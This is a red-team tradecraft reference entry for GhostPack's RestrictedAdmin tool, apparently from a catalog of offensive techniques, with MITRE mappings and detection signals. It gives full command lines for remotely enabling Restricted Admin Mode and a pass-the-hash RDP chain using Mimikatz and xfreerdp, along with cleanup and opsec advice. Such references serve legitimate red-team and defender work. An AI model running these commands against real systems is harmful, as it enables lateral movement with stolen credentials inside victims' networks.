---
name: RestrictedAdmin
category: lateral-movement
subcategories: [restricted-admin-mode, rdp-pth, registry-modification]
tradecraft_tags: [rdp, restricted-admin, pass-the-hash, rdp-pth, registry, dotnet, ghostpack, apollo-runnable]
mitre_attack:
  - id: T1021.001
    name: Remote Services — Remote Desktop Protocol
  - id: T1550.002
    name: Use Alternate Authentication Material — Pass the Hash
source:
  url: https://github.com/GhostPack/RestrictedAdmin
  license: BSD-3-Clause
  maintained: true
binary_type: .net-assembly
binary_filename: RestrictedAdmin.exe
supported_os: [windows]
architecture: [x64]
privilege_required: local-admin
network_required: true
detection_signal: |
  RestrictedAdmin modifies the registry key that enables Restricted Admin Mode for RDP:
  `HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0`.
  This registry write generates Sysmon Event 13 (RegistryValueSet) and is audited if
  security object access auditing is enabled on the remote host. The subsequent
  pass-the-hash RDP connection generates Event 4624 with logon type 10 (RemoteInteractive).
usage_examples:
  - description: Enable Restricted Admin Mode on a remote host
    args: "RestrictedAdmin.exe enable /computername:WINTERFELL /username:NORTH\\\\administrator /password:Password123"
  - description: Enable via hash (pass-the-hash to set registry on remote)
    args: "RestrictedAdmin.exe enable /computername:WINTERFELL /username:NORTH\\\\administrator /hash:<nthash>"
  - description: Check if Restricted Admin Mode is enabled on a host
    args: "RestrictedAdmin.exe check /computername:WINTERFELL /username:NORTH\\\\administrator /password:Password123"
  - description: Disable (cleanup)
    args: "RestrictedAdmin.exe disable /computername:WINTERFELL /username:NORTH\\\\administrator /password:Password123"
opsec_notes: |
  RestrictedAdmin remotely enables Restricted Admin Mode on target hosts by writing a
  registry key via the remote registry service. Once enabled, RDP connections can be
  made with NT hashes (pass-the-hash) rather than cleartext passwords — enabling RDP
  lateral movement with harvested hashes. The registry modification is persistent until
  disabled. Cleanup: run RestrictedAdmin.exe disable after completing RDP-based lateral
  movement. The registry write is auditable; the subsequent PTH RDP connection is a
  different event type (type 10 vs type 3) from normal RDP.
gotchas: |
  Requires local-admin on the remote host to write the registry key (remote registry
  service must be running). Once Restricted Admin Mode is enabled, use mstsc.exe
  /RestrictedAdmin or similar RDP client with PTH support to connect. The hash is
  NOT sent to the remote host in Restricted Admin Mode — which is also why it prevents
  credential harvesting FROM the RDP server (a security feature). Note: PTH via
  Restricted Admin leaves a type-10 logon event (interactive) rather than type-3
  (network) — more visible than WMI/WinRM PTH.
related_ttps: [sharprdp, pass-the-hash, mimikatz, impacket-secretsdump]
alternatives: [sharprdp-restricted-mode, xfreerdp-pth, impacket-rdp]
common_args:
  enable:
    description: Enable Restricted Admin Mode on target
    typical_values: [flag-only]
  disable:
    description: Disable Restricted Admin Mode on target
    typical_values: [flag-only]
  check:
    description: Check if Restricted Admin Mode is enabled on target
    typical_values: [flag-only]
  /computername:
    description: Target hostname or IP
    typical_values: ["WINTERFELL", "192.168.56.22"]
    required: true
  /username:
    description: Authentication username (DOMAIN\\user format)
    typical_values: ["NORTH\\\\administrator"]
    required: true
  /password:
    description: Authentication password
    typical_values: ["Password123"]
  /hash:
    description: NT hash for pass-the-hash
    typical_values: ["<nthash>"]
last_updated: 2026-05-29
---

# RestrictedAdmin

GhostPack's tool for remotely enabling Windows Restricted Admin Mode — a prerequisite
for pass-the-hash RDP lateral movement. Restricted Admin Mode allows RDP connections
where the connecting user's credentials are NOT forwarded to the remote host; instead,
only the local machine's identity is used. This behavior is what makes PTH-via-RDP
possible (the hash never needs to be "cracked" to full credentials).

## How Restricted Admin Mode Works

```
Standard RDP:
  Client sends credentials → Target validates → Credentials cached on target
  
Restricted Admin Mode:
  Client connects with local machine identity → No credentials forwarded to target
  PTH path: provide NT hash → mstsc authenticates locally → no cleartext needed
  Security property: Target cannot harvest the connecting user's credentials
```

## Full Restricted Admin PTH Chain

```
Step 1: Enable Restricted Admin Mode on target:
RestrictedAdmin.exe enable /computername:WINTERFELL \
    /username:NORTH\administrator /hash:<admin-nthash>

Step 2: Connect via PTH RDP from a Windows machine:
# Using mstsc with injected NTLM token:
Mimikatz: sekurlsa::pth /user:administrator /domain:NORTH /ntlm:<hash> /run:"mstsc /RestrictedAdmin /v:WINTERFELL"
# OR using xfreerdp from Linux:
xfreerdp /u:administrator /pth:<nthash> /v:WINTERFELL /d:NORTH

Step 3: Cleanup:
RestrictedAdmin.exe disable /computername:WINTERFELL \
    /username:NORTH\administrator /hash:<admin-nthash>
```

## When to Use RDP vs Other Lateral Movement

RDP PTH is most useful when:
- Interactive desktop access is required (GUI applications, active user engagement)
- WMI/WinRM are blocked but RDP (TCP 3389) is accessible
- The operator needs to run interactive tools that require a desktop session

RDP generates more detectable events than WMI/WinRM PTH — use it when the interactive
session is specifically needed, not as a default lateral movement method.
